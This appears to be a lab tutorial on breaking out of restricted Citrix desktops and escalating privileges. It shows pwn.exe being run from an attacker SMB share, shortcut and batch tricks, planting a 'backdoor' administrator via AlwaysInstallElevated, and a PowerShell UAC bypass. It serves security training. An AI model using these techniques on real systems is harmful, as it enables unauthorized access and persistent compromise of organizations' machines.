# Citrix Breakout

---

Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.

---

Basic Methodology for break-out:

1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.
4. Explorer ++
5. third party registry editor
6. modifying shortcuts to point to cmd,exe
7. .lnk pointing to cmd.exe with powershell
8. pwn.c to laucn cmd.exe
9. script execution

## Accessing SMB share from restricted environment

Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation.
```shell-session
smbserver.py -smb2support share $(pwd)
```

Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.

![Command prompt running pwn.exe from network share \10.13.38.95\share. Message indicates CMD.EXE started with UNC path, defaulting to Windows directory. Windows version 6.1.7601 displayed.](https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png)

The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.

Code: c

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```
We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.

## Alternate Explorer

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

It's worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of `Explorer++`, the capability to copy files from the `\\10.13.38.95\share` location to the Desktop belonging to the user `pmorgan` has been successfully demonstrated in following screenshot.

![File Explorer window showing Desktop folder with files: Bypass-UAC.ps1, desktop.ini, Explorer++, My_Shortcut, PowerUp.ps1, pwn.c, and pwn.exe.](https://academy.hackthebox.com/storage/modules/67/Explorer++.png)

[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.

## Alternate Registry Editors

![Small Registry Editor window showing registry keys: HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and HKEY_CURRENT_CONFIG. HKEY_CURRENT_CONFIG is selected, displaying default string value not set.](https://academy.hackthebox.com/storage/modules/67/smallregistry.png)

Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify existing shortcut file

Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

The following steps outline the process:

1. `Right-click` the desired shortcut.
    
2. Select `Properties`. ![File Explorer window showing Desktop folder. Context menu open for 'My_Shortcut' with options like Open, Copy, Delete, and Properties. Shortcut size is 979 bytes.](https://academy.hackthebox.com/storage/modules/67/shortcut_1.png)
    
3. Within the `Target` field, modify the path to the intended folder for access.

4.  ![File Explorer window showing Desktop folder. 'My_Shortcut' properties open, displaying target type as File folder, target location as Users, and target as C:\Windows\System32\cmd.exe.](https://academy.hackthebox.com/storage/modules/67/shortcut_2.png)
    
5. Execute the Shortcut and cmd will be spawned ![Command prompt window titled 'My_Shortcut' showing Windows version 6.1.7601. Path displayed as C:\Users\pmorgan\Desktop.](https://academy.hackthebox.com/storage/modules/67/shortcut_3.png)
    

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab. These approaches provide versatility in achieving our objectives while working with shortcut files.

## Script Execution

When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file. ![File Explorer window showing Desktop folder. Notepad open with file 'evil.bat' containing the text 'cmd'. File size is 3 bytes.](https://academy.hackthebox.com/storage/modules/67/script_bat.png)
4. Save the file.

Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

## Escalating Privileges

Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

  Citrix Breakout

```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

  Citrix Breakout

```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

![File Explorer window showing Desktop. 'User Add' dialog open with fields: Username 'backdoor', Password 'T3st@123', Group 'Administrators'. Create button visible.](https://academy.hackthebox.com/storage/modules/67/useradd.png)

Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

  Citrix Breakout

```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

---

## Bypassing UAC

Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

  Citrix Breakout

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

  Citrix Breakout

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

![Command prompt running as VDESKTOP3\backdoor with PowerShell bypass. Script imports Bypass-UAC.ps1 and executes UacMethodSysprep. Outputs include impersonating explorer.exe, dropping proxy DLL, and executing sysprep.](https://academy.hackthebox.com/storage/modules/67/bypass_uac.png)

Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.

![Command prompt showing directory listing of C:\Users\Administrator\Desktop with file flag.txt, size 19 bytes. 'whoami' command output: vdesktop3\backdoor.](https://academy.hackthebox.com/storage/modules/67/flag.png)
